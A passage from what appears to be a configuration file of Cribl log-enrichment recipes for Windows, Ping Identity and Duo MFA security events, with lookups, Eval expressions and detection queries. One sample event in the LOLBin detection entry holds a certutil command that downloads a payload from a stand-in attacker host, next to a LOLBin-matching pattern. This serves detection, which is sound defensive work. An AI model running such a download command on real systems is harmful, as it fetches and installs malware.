        personas: ['SOC', 'Security Engineering', 'Threat Hunting', 'Incident Response'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'windows_mitre_mapping.csv',
            inputField: 'event_id → event_id',
            outputFields: ['mitre_technique_id', 'mitre_technique_name', 'mitre_tactic'],
            reloadInterval: '24 hours'
          },
          lookupSample: 'event_id,mitre_technique_id,mitre_technique_name,mitre_tactic\n4625,T1110,Brute Force,Credential Access\n4720,T1136.001,Create Account - Local,Persistence\n4728,T1098,Account Manipulation,Persistence\n4769,T1558.003,Kerberoasting,Credential Access',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: windows_mitre_mapping.csv\n// Input: event_id → event_id (exact match)\n// Output: mitre_technique_id, mitre_technique_name, mitre_tactic\n//\n// BEFORE: { event_id: 4769, target_username: "svc-sql", ticket_encryption: "0x17" }\n// AFTER:  { event_id: 4769, mitre_technique_id: "T1558.003", mitre_technique_name: "Kerberoasting", mitre_tactic: "Credential Access" }',
          notes: 'Base mapping covers common security EventIDs. For context-specific precision (e.g., 4769 + RC4 encryption = Kerberoasting), combine with an Eval function that upgrades confidence when additional fields match.'
        }
      },
      {
        name: 'Sensitive Group Lookup',
        description: 'Enrich group SID or group name with sensitivity classification, administrative status, and escalation risk when group membership changes are detected.',
        criblFunction: 'Lookup',
        addedFields: ['group_sensitivity', 'is_admin_group', 'escalation_risk'],
        securityValue: 'Any modification to Tier-0 groups (Domain Admins, Enterprise Admins) is a critical security event. Pre-tagging enables instant escalation routing and bypasses normal alert thresholds for the most sensitive group changes.',
        observabilityValue: 'Tracks privileged group membership changes over time, supports access review evidence collection, identifies unexpected group modifications.',
        personas: ['SOC', 'Security Engineering', 'Identity Team', 'Compliance'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'sensitive_groups.csv',
            inputField: 'target_group_name → group_name',
            outputFields: ['group_sensitivity', 'is_admin_group', 'escalation_risk'],
            reloadInterval: '24 hours'
          },
          lookupSample: 'group_name,group_sensitivity,is_admin_group,escalation_risk\nDomain Admins,critical,true,critical\nEnterprise Admins,critical,true,critical\nBackup Operators,high,true,high\nRemote Desktop Users,medium,false,medium',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: sensitive_groups.csv\n// Input: target_group_name → group_name (case-insensitive)\n// Output: group_sensitivity, is_admin_group, escalation_risk\n// Filter: Apply to events where event_id in (4728, 4732, 4756, 4729, 4733, 4757)\n//\n// BEFORE: { event_id: 4728, target_group_name: "Domain Admins", subject_username: "admin-bob" }\n// AFTER:  { event_id: 4728, target_group_name: "Domain Admins", group_sensitivity: "critical", is_admin_group: "true", escalation_risk: "critical" }',
          notes: 'Focus on EventIDs 4728/4732/4756 (member added) and 4729/4733/4757 (member removed). Any change to critical groups should trigger immediate security review regardless of who made the change.'
        }
      },
      {
        name: 'Process Reputation Eval',
        description: 'Classify processes by executable path and digital signature status to identify living-off-the-land binaries (LOLBins) and unsigned executables in security-relevant events.',
        criblFunction: 'Eval',
        addedFields: ['process_risk', 'is_lolbin', 'is_unsigned'],
        securityValue: 'Immediately flags LOLBin usage (certutil, mshta, regsvr32, rundll32 used maliciously) and unsigned processes in process creation events (4688). Enables detection of living-off-the-land techniques without complex SIEM rules.',
        observabilityValue: 'Tracks LOLBin usage frequency and unsigned process execution rates as fleet security hygiene metrics.',
        personas: ['SOC', 'Security Engineering', 'Threat Hunting', 'Endpoint Team'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expression: 'Process path and signer classification logic',
            outputFields: ['process_risk', 'is_lolbin', 'is_unsigned']
          },
          example: '// Cribl Stream → Processing → Eval Function\n// Expression: Classify process risk based on path and known LOLBin names\n// is_lolbin = match(new_process_name, /certutil|mshta|regsvr32|rundll32|wscript|cscript/) ? "true" : "false"\n// is_unsigned = token_elevation_type == "%%1937" ? "true" : "false"\n// process_risk = is_lolbin == "true" ? "high" : is_unsigned == "true" ? "medium" : "low"\n//\n// BEFORE: { event_id: 4688, new_process_name: "certutil.exe", command_line: "certutil -urlcache -f http://evil.com/payload.exe" }\n// AFTER:  { ..., process_risk: "high", is_lolbin: "true", is_unsigned: "false" }',
          notes: 'LOLBin detection at pipeline level reduces SIEM detection rule complexity. Focus on Event 4688 (Process Creation) with command line auditing enabled. Combine with command_line content for high-confidence alerts.'
        }
      }
    ],
    searchTime: [
      {
        name: 'Baseline Auth Pattern',
        description: 'Compare current authentication behavior against pre-computed per-user baselines to identify anomalous logon times and frequency.',
        criblFunction: 'Search-time lookup',
        addedFields: ['normal_logon_hours', 'logon_anomaly_score'],
        securityValue: 'Detects compromised accounts through behavioral deviation — "this account normally logs on 8am-6pm weekdays but is now authenticating at 2am Saturday." Adapts to individual patterns without manual threshold tuning.',
        observabilityValue: 'Supports workforce pattern analysis, identifies off-hours access trends, enables capacity planning for authentication infrastructure.',
        personas: ['Threat Hunting', 'SOC', 'Security Engineering'],
        implementation: {
          example: '// Cribl Search behavioral comparison:\n// dataset="windows_security" event_id==4624 target_username=="$USER" earliest=-1d\n// | extend hour_of_day = hourofday(timestamp)\n// | lookup user_auth_baselines.csv on target_username=username output normal_hours_start, normal_hours_end, avg_daily_logons\n// | extend logon_anomaly_score = (hour_of_day < normal_hours_start || hour_of_day > normal_hours_end) ? 60 : 0\n// | extend logon_anomaly_score = logon_anomaly_score + iif(count() > avg_daily_logons * 3, 40, 0)\n// | where logon_anomaly_score > 50\n// | project target_username, hour_of_day, normal_logon_hours=strcat(normal_hours_start, \"-\", normal_hours_end), logon_anomaly_score',
          notes: 'Requires baseline dataset computed from 30-day rolling averages per user (typical hours, daily logon count). Deviations > 50 score warrant investigation.'
        }
      },
      {
        name: 'Account Change History',
        description: 'Query recent account modification events (password changes, group membership, attribute updates) to provide change context during investigations.',
        criblFunction: 'Search-time lookup',
        addedFields: ['recent_changes_7d', 'last_password_change'],
        securityValue: 'During investigation, immediately answers "was this account recently modified?" — recent password resets followed by suspicious logons indicate credential compromise via social engineering of helpdesk.',
        observabilityValue: 'Supports access review auditing and change frequency tracking for compliance reporting.',
        personas: ['Incident Response', 'SOC', 'Identity Team', 'Compliance'],
        implementation: {
          example: '// Cribl Search account change analysis:\n// dataset="windows_security" target_username=="$USER" event_id in (4723, 4724, 4728, 4732, 4738) earliest=-7d\n// | summarize recent_changes_7d=count(), last_password_change=maxif(timestamp, event_id in (4723, 4724)),\n//     groups_added=makeset(iif(event_id==4728, target_group_name, "")),\n//     attribute_changes=countif(event_id==4738)\n//   by target_username\n// | extend change_velocity = iif(recent_changes_7d > 5, \'high\', iif(recent_changes_7d > 2, \'medium\', \'low\'))',
          notes: 'Key EventIDs: 4723=password change attempt, 4724=password reset by admin, 4728=added to global group, 4732=added to local group, 4738=account attribute modified. High change velocity + subsequent anomalous logon = strong compromise indicator.'
        }
      }
    ]
  },
  'windows-system': {
    streamTime: [
      {
        name: 'Service Criticality Lookup',
        description: 'Map Windows service names to business criticality tier, owning team, and SLA-driven restart expectations from a service catalog CSV.',
        criblFunction: 'Lookup',
        addedFields: ['service_tier', 'service_owner', 'is_business_critical', 'restart_sla'],
        securityValue: 'When security-critical services (Windows Defender, Event Log, LSASS protection) stop, immediately identifies impact and urgency. Attackers commonly disable security services before lateral movement.',
        observabilityValue: 'Enables SLA-aligned alerting — Tier-1 service failures page immediately, Tier-3 failures create next-day tickets. Supports MTTR tracking by service tier.',
        personas: ['NOC', 'SRE', 'Platform Engineering', 'SOC'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'windows_service_catalog.csv',
            inputField: 'service_name → service',
            outputFields: ['service_tier', 'service_owner', 'is_business_critical', 'restart_sla'],
            reloadInterval: '4 hours'
          },
          lookupSample: 'service,service_tier,service_owner,is_business_critical,restart_sla\nW3SVC,Tier-1,web-team,true,5m\nMSSQLSERVER,Tier-1,dba-team,true,5m\nWinDefend,Tier-1,security-ops,true,immediate\nSpooler,Tier-3,desktop-support,false,4h',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: windows_service_catalog.csv\n// Input: service_name → service (exact match, case-insensitive)\n// Output: service_tier, service_owner, is_business_critical, restart_sla\n//\n// BEFORE: { event_id: 7036, service_name: "W3SVC", service_state: "stopped" }\n// AFTER:  { event_id: 7036, service_name: "W3SVC", service_tier: "Tier-1", service_owner: "web-team", is_business_critical: "true", restart_sla: "5m" }',
          notes: 'Generate from: Get-Service | Select Name, DisplayName, Status. Map to owning teams from CMDB. Focus on Event 7036 (service state change) and 7045 (new service installed).'
        }
      },
      {
        name: 'Error Severity Classification',
        description: 'Map combinations of Windows System event level and EventID to operational severity tiers with action requirements.',
        criblFunction: 'Eval',
        addedFields: ['ops_severity', 'requires_action', 'auto_ticket'],
        securityValue: 'Kernel-level errors (bugcheck, driver failures) can indicate rootkit activity or exploitation attempts. Classifying severity ensures critical system errors get security team visibility alongside operations.',
        observabilityValue: 'Standardizes event severity across all Windows System log sources into actionable priority tiers. Enables "P1 system events per hour" dashboards without manual threshold configuration.',
        personas: ['NOC', 'SRE', 'Platform Engineering', 'SOC'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expression: 'Event level + ID to severity classification',
            outputFields: ['ops_severity', 'requires_action', 'auto_ticket']
          },
          example: '// Cribl Stream → Processing → Eval Function\n// Expressions:\n// ops_severity = (event_level == 1 || event_id == 6008) ? \'critical\'\n//   : (event_level == 2 && event_id >= 7000 && event_id <= 7045) ? \'high\'\n//   : event_level == 2 ? \'medium\'\n//   : event_level == 3 ? \'low\' : \'info\'\n//\n// requires_action = ops_severity in (\'critical\', \'high\') ? \'true\' : \'false\'\n// auto_ticket = (ops_severity == \'critical\') ? \'true\'\n//   : (ops_severity == \'high\' && is_business_critical == \'true\') ? \'true\' : \'false\'\n//\n// BEFORE: { event_level: 1, event_id: 6008, provider_name: "EventLog" }\n// AFTER:  { event_level: 1, event_id: 6008, ops_severity: "critical", requires_action: "true", auto_ticket: "true" }',
          notes: 'Event 6008 = unexpected shutdown (potential crash or power loss). Events 7000-7045 = service failures. Level 1 = Critical, Level 2 = Error, Level 3 = Warning. Tune auto_ticket thresholds per environment.'
        }
      },
      {
        name: 'Hardware Asset Lookup',
        description: 'Enrich computer name with hardware model, warranty status, physical location, and rack position from CMDB/asset inventory.',
        criblFunction: 'Lookup',
        addedFields: ['hardware_model', 'warranty_status', 'location', 'rack_position'],
        securityValue: 'Hardware context during security investigations — identifies whether a compromised system is a physical server in a secured data center or a laptop that could be physically accessed. Warranty status affects evidence preservation decisions.',
        observabilityValue: 'Enables hardware-correlated failure analysis, identifies models with disproportionate error rates, supports warranty-based replacement planning and data center capacity mapping.',
        personas: ['NOC', 'Platform Engineering', 'Data Center Ops', 'Incident Response'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'hardware_assets.csv',
            inputField: 'computer_name → hostname',
            outputFields: ['hardware_model', 'warranty_status', 'location', 'rack_position'],
            reloadInterval: '24 hours'
          },
          lookupSample: 'hostname,hardware_model,warranty_status,location,rack_position\nSRV-SQL-01,Dell PowerEdge R750,active,DC-East-Rack14,U22-U25\nSRV-WEB-03,HPE ProLiant DL380,expired,DC-West-Rack08,U10-U11\nWKSTN-JSMITH,Lenovo ThinkPad T14s,active,Office-Floor3,N/A\nSRV-FILE-01,Dell PowerEdge R650,active,DC-East-Rack07,U30-U31',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: hardware_assets.csv\n// Input: computer_name → hostname (case-insensitive)\n// Output: hardware_model, warranty_status, location, rack_position\n//\n// BEFORE: { computer_name: "SRV-SQL-01", event_id: 7, provider_name: "Disk" }\n// AFTER:  { computer_name: "SRV-SQL-01", hardware_model: "Dell PowerEdge R750", warranty_status: "active", location: "DC-East-Rack14", rack_position: "U22-U25" }',
          notes: 'Pull from ServiceNow CMDB or asset management system. Warranty status determines replacement vs repair decisions. Location enables physical inspection dispatch for hardware errors.'
        }
      },
      {
        name: 'Event Category Tagging',
        description: 'Classify Windows System events by provider name and EventID into operational categories and subsystems for filtering and routing.',
        criblFunction: 'Eval',
        addedFields: ['event_category', 'subsystem', 'alert_eligible'],
        securityValue: 'Tags security-relevant system events (driver loads, new services, time changes) for security team routing. Event 7045 (new service) and 1 (driver load) are common persistence mechanisms.',
        observabilityValue: 'Enables category-based dashboards (disk, network, service, hardware, time) without requiring analysts to memorize provider names and EventIDs.',
        personas: ['NOC', 'SRE', 'Platform Engineering', 'SOC'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expression: 'Provider + EventID category classification',
            outputFields: ['event_category', 'subsystem', 'alert_eligible']
          },
          example: '// Cribl Stream → Processing → Eval Function\n// Expressions:\n// event_category = provider_name == \'Microsoft-Windows-Kernel-General\' ? \'kernel\'\n//   : provider_name == \'Disk\' || provider_name == \'disk\' ? \'disk\'\n//   : provider_name == \'Service Control Manager\' ? \'service\'\n//   : provider_name == \'Microsoft-Windows-Kernel-Power\' ? \'power\'\n//   : provider_name == \'Tcpip\' || provider_name == \'Microsoft-Windows-TCPIP\' ? \'network\'\n//   : provider_name == \'Microsoft-Windows-Time-Service\' ? \'time-sync\' : \'other\'\n//\n// subsystem = event_category in (\'disk\', \'power\') ? \'hardware\'\n//   : event_category in (\'service\', \'kernel\') ? \'os-core\'\n//   : event_category == \'network\' ? \'networking\' : \'general\'\n//\n// alert_eligible = (event_category == \'service\' && event_id == 7045) ? \'true\'\n//   : (event_category == \'disk\' && event_level <= 2) ? \'true\'\n//   : ops_severity in (\'critical\', \'high\') ? \'true\' : \'false\'\n//\n// BEFORE: { provider_name: "Disk", event_id: 7, event_level: 2 }\n// AFTER:  { provider_name: "Disk", event_id: 7, event_category: "disk", subsystem: "hardware", alert_eligible: "true" }',
          notes: 'Event 7045 (new service installed) is a critical persistence indicator. Disk errors (Event 7, 11, 15, 51) indicate hardware degradation. Time sync changes can indicate timestamp manipulation to cover tracks.'
        }
      },
      {
        name: 'Disk Health Scoring',
        description: 'Calculate cumulative disk health score based on error frequency and recency, predicting failure risk for proactive maintenance.',
        criblFunction: 'Eval',
        addedFields: ['disk_health_score', 'predicted_failure_risk'],
        securityValue: 'Disk failures can compromise log integrity and forensic evidence availability. Proactive identification of failing disks ensures security logging and evidence storage remain reliable.',
        observabilityValue: 'Enables proactive disk replacement before failure. Transforms reactive disk error alerting into predictive maintenance with risk scoring and failure probability estimates.',
        personas: ['NOC', 'Platform Engineering', 'Data Center Ops', 'SRE'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expression: 'Disk error scoring and failure prediction logic',
            outputFields: ['disk_health_score', 'predicted_failure_risk']
          },
          example: '// Cribl Stream → Processing → Eval Function\n// Expressions:\n// // Score starts at 100 (healthy), deducts for each error type\n// disk_health_score = 100\n//   - (event_id == 7 ? 20 : 0)    // Bad block\n//   - (event_id == 11 ? 15 : 0)   // Controller error\n//   - (event_id == 15 ? 25 : 0)   // Device not ready\n//   - (event_id == 51 ? 30 : 0)   // Paging error\n//   - (event_id == 153 ? 10 : 0)  // IO retry\n//\n// predicted_failure_risk = disk_health_score <= 50 ? \'critical\'\n//   : disk_health_score <= 70 ? \'high\'\n//   : disk_health_score <= 85 ? \'medium\' : \'low\'\n//\n// BEFORE: { provider_name: "Disk", event_id: 51, disk_device: "\\\\Device\\\\Harddisk1" }\n// AFTER:  { provider_name: "Disk", event_id: 51, disk_health_score: 70, predicted_failure_risk: "high" }',
          notes: 'Single-event scoring gives immediate risk context. For cumulative scoring over time, combine with search-time aggregation of error counts per disk over 7/30 day windows. Event 51 (paging errors) is the strongest failure predictor.'
        }
      }
    ],
    searchTime: [
      {
        name: 'Service Restart History',
        description: 'Aggregate service state change events over time to calculate restart frequency and identify unstable services.',
        criblFunction: 'Search-time lookup',
        addedFields: ['restart_count_7d', 'last_restart_time'],
        securityValue: 'Rapidly restarting security services (Defender, EventLog) may indicate active tampering by an attacker. High restart counts on security-critical services warrant immediate investigation.',
        observabilityValue: 'Identifies flapping services requiring engineering attention. Services with high restart counts indicate underlying issues (memory leaks, resource contention, configuration errors).',
        personas: ['NOC', 'SRE', 'Platform Engineering', 'SOC'],
        implementation: {
          example: '// Cribl Search service restart analysis:\n// dataset="windows_system" event_id==7036 earliest=-7d\n// | where service_state == "running"\n// | summarize restart_count_7d=count(), last_restart_time=max(timestamp) by computer_name, service_name\n// | lookup windows_service_catalog.csv on service_name=service output service_tier, service_owner, is_business_critical\n// | where restart_count_7d > 3\n// | extend stability = iif(restart_count_7d > 10, \'unstable\', iif(restart_count_7d > 5, \'degraded\', \'warning\'))\n// | order by restart_count_7d desc',
          notes: 'Normal services restart 0-1 times in 7 days (planned patching). >3 restarts = investigate. >10 restarts = unstable/flapping. Security services with any unexpected restart = immediate security review.'
        }
      },
      {
        name: 'Hardware Failure Trending',
        description: 'Analyze disk and hardware error event rates over time to identify degradation trends and estimate mean time between failures (MTBF).',
        criblFunction: 'Search-time lookup',
        addedFields: ['error_rate_trend', 'mtbf_estimate'],
        securityValue: 'Trending hardware failures can impact forensic readiness and log availability. Proactive identification ensures security data stores are migrated before failure.',
        observabilityValue: 'Enables predictive maintenance by identifying accelerating error rates. Transforms individual error events into trend-based failure prediction and MTBF estimates for capacity planning.',
        personas: ['NOC', 'Platform Engineering', 'Data Center Ops', 'SRE'],
        implementation: {
          example: '// Cribl Search hardware trending:\n// dataset="windows_system" provider_name in ("Disk", "disk", "Microsoft-Windows-Kernel-StoreMgr") earliest=-30d\n// | summarize errors_this_week=countif(timestamp > ago(7d)), errors_last_week=countif(timestamp between(ago(14d), ago(7d))),\n//     errors_prev_week=countif(timestamp between(ago(21d), ago(14d))),\n//     first_error=min(timestamp), total_errors=count()\n//   by computer_name, disk_device\n// | extend error_rate_trend = iif(errors_this_week > errors_last_week * 2, \'accelerating\',\n//     iif(errors_this_week > errors_last_week, \'increasing\', \'stable\'))\n// | extend operational_days = datetime_diff(\'day\', now(), first_error)\n// | extend mtbf_estimate = iif(total_errors > 0, strcat(round(operational_days * 24 / total_errors, 1), \'h\'), \'N/A\')\n// | where error_rate_trend == \'accelerating\'\n// | order by errors_this_week desc',
          notes: 'Accelerating error rates (this week > 2x last week) strongly predict imminent failure. MTBF below 24h means the disk is likely to fail within days. Schedule replacement immediately.'
        }
      }
    ]
  },
  'ping-identity': {
    streamTime: [
      {
        name: 'GeoIP Enrichment',
        description: 'Add geographic context to authentication source IP addresses using MaxMind GeoIP database for location-based risk assessment.',
        criblFunction: 'GeoIP',
        addedFields: ['geo_country', 'geo_city', 'geo_asn', 'geo_org'],
        securityValue: 'Enables impossible travel detection for federated authentication, identifies logins from embargoed nations or bulletproof hosting ASNs, enriches risk scoring with geographic context.',
        observabilityValue: 'Enables geographic distribution dashboards for authentication traffic, supports regional capacity planning for PingFederate nodes.',
        personas: ['SOC', 'Security Engineering', 'Identity Team'],
        implementation: {
          functionConfig: {
            function: 'GeoIP',
            inputField: 'ip_address',
            geoipDatabase: 'MaxMind GeoLite2-City + GeoLite2-ASN',
            outputFields: ['geo_country', 'geo_city', 'geo_asn', 'geo_org']
          },
          example: '// Cribl Stream → Processing → GeoIP Function\n// Input Field: ip_address\n// Output Fields: geo_country, geo_city, geo_asn, geo_org\n// Filter: Only apply when ip_address is external (not RFC1918)\n//\n// BEFORE: { ip_address: "203.0.113.42", user: "jsmith@corp.com", action: "SSO_LOGIN" }\n// AFTER:  { ip_address: "203.0.113.42", geo_country: "DE", geo_city: "Frankfurt",\n//           geo_asn: "AS24940", geo_org: "Hetzner Online", user: "jsmith@corp.com" }',
          notes: 'Skip GeoIP for internal PingFederate service-to-service calls. Only enrich external client IPs from browser-initiated SSO flows.'
        }
      },
      {
        name: 'User Risk Score Lookup',
        description: 'Enrich authenticating user against a pre-computed risk history table including risk score, category, and last risk-triggering event.',
        criblFunction: 'Lookup',
        addedFields: ['user_risk_score', 'risk_category', 'last_risk_event'],
        securityValue: 'Correlates real-time authentication events with historical risk posture. A high-risk user authenticating to a sensitive application combines signals for immediate escalation without downstream SIEM correlation.',
        observabilityValue: 'Supports risk-stratified authentication metrics — track success rates and latency segmented by user risk tier for identity platform health monitoring.',
        personas: ['SOC', 'Security Engineering', 'Identity Team'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'user_risk_history.csv',
            inputField: 'user → username',
            outputFields: ['user_risk_score', 'risk_category', 'last_risk_event'],
            reloadInterval: '15 minutes'
          },
          lookupSample: 'username,risk_score,risk_category,last_risk_event\njsmith@corp.com,25,low,none\nadmin-bob@corp.com,78,high,impossible_travel_2026-06-01\ncontractor-jane@corp.com,55,medium,new_device_2026-05-28\nexec-vp@corp.com,40,medium,password_reset_2026-06-05',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: user_risk_history.csv\n// Input: user → username (exact match, case-insensitive)\n// Output: risk_score → user_risk_score, risk_category, last_risk_event\n//\n// BEFORE: { user: "admin-bob@corp.com", action: "SSO_LOGIN", app: "AWS Console" }\n// AFTER:  { user: "admin-bob@corp.com", user_risk_score: 78, risk_category: "high", last_risk_event: "impossible_travel_2026-06-01" }',
          notes: 'Compute risk scores from aggregated identity signals (failed MFA, impossible travel, new device logins) via scheduled job running every 15 minutes. Feed from PingOne Risk or custom UEBA.'
        }
      },
      {
        name: 'Application Classification Lookup',
        description: 'Map the target application or SP connection to criticality tier, owning business unit, and responsible application owner from the app inventory.',
        criblFunction: 'Lookup',
        addedFields: ['app_criticality', 'app_business_unit', 'app_owner'],
        securityValue: 'Enables priority-based alerting — failed authentication to a Tier-1 PCI-scoped application is critical, while the same failure against an internal wiki is low priority. Routes alerts to the correct team.',
        observabilityValue: 'Supports per-application and per-business-unit authentication metrics, license utilization tracking, and application rationalization analysis.',
        personas: ['SOC', 'Identity Team', 'Compliance', 'SRE'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'app_inventory.csv',
            inputField: 'application → app_name',
            outputFields: ['app_criticality', 'app_business_unit', 'app_owner'],
            reloadInterval: '24 hours'
          },
          lookupSample: 'app_name,criticality,business_unit,owner\nAWS Console,Tier-1,Platform Engineering,cloud-ops\nSalesforce,Tier-1,Sales,sales-ops\nJira,Tier-2,Engineering,devtools-team\nInternal Wiki,Tier-3,All,it-support\nPayroll System,Tier-1,HR,hr-systems',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: app_inventory.csv\n// Input: application → app_name (exact match)\n// Output: criticality → app_criticality, business_unit → app_business_unit, owner → app_owner\n//\n// BEFORE: { user: "jsmith@corp.com", application: "AWS Console", action: "SSO_LOGIN" }\n// AFTER:  { user: "jsmith@corp.com", application: "AWS Console", app_criticality: "Tier-1", app_business_unit: "Platform Engineering", app_owner: "cloud-ops" }',
          notes: 'Source from PingFederate SP Connection inventory or CMDB. Include compliance scope (PCI, SOX) as an additional field if needed for regulatory alerting.'
        }
      },
      {
        name: 'Auth Method Strength Eval',
        description: 'Classify the authentication method used (password-only, MFA-push, FIDO2, certificate) into strength levels with a numeric score for risk calculation.',
        criblFunction: 'Eval',
        addedFields: ['auth_strength_level', 'auth_strength_score'],
        securityValue: 'Enables detection of authentication downgrade attacks — if a user normally authenticates with FIDO2 but suddenly uses password-only, the strength drop is immediately visible for correlation.',
        observabilityValue: 'Tracks MFA adoption metrics and authentication method distribution across the user population. Supports initiatives to migrate users to stronger factors.',
        personas: ['SOC', 'Identity Team', 'Security Engineering', 'Compliance'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expression: 'Classify auth_method into strength tiers',
            outputFields: ['auth_strength_level', 'auth_strength_score']
          },
          example: '// Cribl Stream → Processing → Eval Function\n// Expressions:\n// auth_strength_level = auth_method == \'FIDO2\' || auth_method == \'WebAuthn\' ? \'strong\'\n//   : auth_method == \'TOTP\' || auth_method == \'Push\' ? \'moderate\'\n//   : auth_method == \'SMS\' ? \'weak\'\n//   : auth_method == \'Password\' ? \'minimal\' : \'unknown\'\n//\n// auth_strength_score = auth_strength_level == \'strong\' ? 100\n//   : auth_strength_level == \'moderate\' ? 70\n//   : auth_strength_level == \'weak\' ? 40\n//   : auth_strength_level == \'minimal\' ? 10 : 0\n//\n// BEFORE: { user: "jsmith@corp.com", auth_method: "FIDO2", action: "MFA_SUCCESS" }\n// AFTER:  { user: "jsmith@corp.com", auth_method: "FIDO2", auth_strength_level: "strong", auth_strength_score: 100 }',
          notes: 'Align strength tiers with NIST AAL levels: FIDO2/Certificate=AAL3 (strong), TOTP/Push=AAL2 (moderate), SMS=AAL2-weak, Password-only=AAL1 (minimal). Alert on strength downgrades.'
        }
      },
      {
        name: 'Device Trust Lookup',
        description: 'Enrich the device identifier or device fingerprint against the managed device inventory to determine corporate management status and compliance posture.',
        criblFunction: 'Lookup',
        addedFields: ['device_managed', 'device_compliance_status', 'device_trust_level'],
        securityValue: 'Identifies authentication from unmanaged or non-compliant devices. A high-risk user on an unmanaged device accessing a Tier-1 app represents maximum risk — enables composite risk scoring.',
        observabilityValue: 'Tracks managed vs unmanaged device authentication ratios, supports BYOD policy compliance monitoring and device enrollment gap analysis.',
        personas: ['SOC', 'Identity Team', 'Endpoint Team', 'Compliance'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'device_inventory.csv',
            inputField: 'device_id → device_identifier',
            outputFields: ['device_managed', 'device_compliance_status', 'device_trust_level'],
            reloadInterval: '30 minutes'
          },
          lookupSample: 'device_identifier,managed,compliance_status,trust_level\nDEV-001-CORP-WIN,true,compliant,high\nDEV-002-CORP-MAC,true,compliant,high\nDEV-003-BYOD-IOS,false,unknown,low\nDEV-004-CORP-WIN,true,non-compliant,medium\nDEV-005-UNKNOWN,false,unknown,none',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: device_inventory.csv\n// Input: device_id → device_identifier (exact match)\n// Output: managed → device_managed, compliance_status → device_compliance_status, trust_level → device_trust_level\n//\n// BEFORE: { user: "jsmith@corp.com", device_id: "DEV-003-BYOD-IOS", action: "SSO_LOGIN" }\n// AFTER:  { user: "jsmith@corp.com", device_id: "DEV-003-BYOD-IOS", device_managed: "false", device_compliance_status: "unknown", device_trust_level: "low" }',
          notes: 'Pull from MDM (Intune, Jamf, Workspace ONE) via API export. Device compliance includes patch level, disk encryption, and endpoint agent presence. Refresh every 30 minutes.'
        }
      }
    ],
    searchTime: [
      {
        name: 'Historical Auth Pattern',
        description: 'Join current authentication events against pre-computed per-user daily baseline authentication counts to identify deviations from normal login frequency.',
        criblFunction: 'Search-time lookup',
        addedFields: ['baseline_auth_count', 'deviation_pct'],
        securityValue: 'Identifies credential sharing or compromise — a user who normally authenticates 5 times/day suddenly authenticating 50 times indicates automated abuse or shared credentials.',
        personas: ['SOC', 'Threat Hunting', 'Identity Team'],
        implementation: {
          example: '// Cribl Search with baseline comparison:\n// dataset="ping_identity_logs" earliest=-24h\n// | summarize current_auth_count=count() by user\n// | lookup user_auth_baselines.csv on user=username output avg_daily_count as baseline_auth_count\n// | extend deviation_pct = round((current_auth_count - baseline_auth_count) * 100.0 / baseline_auth_count, 1)\n// | where deviation_pct > 200\n// | order by deviation_pct desc',
          notes: 'Baseline computed via weekly scheduled job: average daily auth count per user over 30 days. Deviation > 200% warrants investigation. Exclude service accounts with naturally high auth rates.'
        }
      },
      {
        name: 'Peer Group Comparison',
        description: 'Compare a user\'s authentication risk metrics against their peer group (same department, same role) to identify outliers within similar populations.',
        criblFunction: 'Search-time lookup',
        addedFields: ['peer_avg_risk', 'peer_auth_frequency'],
        securityValue: 'Identifies compromised accounts by comparing behavior to peers — if one engineer in a team of 20 has 5x the risk score and 10x the auth frequency, it is likely compromise rather than normal variation.',
        personas: ['SOC', 'Threat Hunting', 'Security Engineering'],
        implementation: {
          example: '// Cribl Search peer group analysis:\n// dataset="ping_identity_logs" earliest=-7d\n// | summarize user_risk_avg=avg(user_risk_score), user_auth_count=count() by user, department\n// | lookup peer_group_baselines.csv on department=department output avg_risk as peer_avg_risk, avg_auth_freq as peer_auth_frequency\n// | extend risk_vs_peers = round(user_risk_avg / peer_avg_risk, 2)\n// | extend freq_vs_peers = round(user_auth_count / (peer_auth_frequency * 7), 2)\n// | where risk_vs_peers > 3.0 or freq_vs_peers > 5.0\n// | order by risk_vs_peers desc',
          notes: 'Peer group baselines computed weekly per department/role. Outlier detection (>3x peer average) is more accurate than absolute thresholds because it accounts for team-specific work patterns.'
        }
      }
    ]
  },
  'duo-mfa': {
    streamTime: [
      {
        name: 'GeoIP Enrichment',
        description: 'Add geographic context to the authentication source IP for identifying anomalous MFA request origins.',
        criblFunction: 'GeoIP',
        addedFields: ['geo_country', 'geo_city', 'geo_asn'],
        securityValue: 'Identifies MFA push requests originating from unexpected countries, enabling impossible travel detection and geographic anomaly alerting for push-based authentication.',
        observabilityValue: 'Enables geographic distribution dashboards for MFA usage, supports capacity planning for Duo proxy deployment across regions.',
        personas: ['SOC', 'Security Engineering', 'Identity Team'],
        implementation: {
          functionConfig: {
            function: 'GeoIP',
            inputField: 'ip_address',
            geoipDatabase: 'MaxMind GeoLite2-City + GeoLite2-ASN',
            outputFields: ['geo_country', 'geo_city', 'geo_asn']
          },
          example: '// Cribl Stream → Processing → GeoIP Function\n// Input Field: ip_address\n// Output Fields: geo_country, geo_city, geo_asn\n// Filter: Only apply on external IPs (skip internal Duo proxy addresses)\n//\n// BEFORE: { ip_address: "185.220.101.5", user: "jsmith", factor: "Duo Push", result: "SUCCESS" }\n// AFTER:  { ip_address: "185.220.101.5", geo_country: "NL", geo_city: "Amsterdam",\n//           geo_asn: "AS60729", user: "jsmith", factor: "Duo Push" }',
          notes: 'When Duo is deployed behind a proxy (Duo Authentication Proxy), ensure you capture the true client IP from the access_device.ip field, not the proxy IP.'
        }
      },
      {
        name: 'Device Health Lookup',
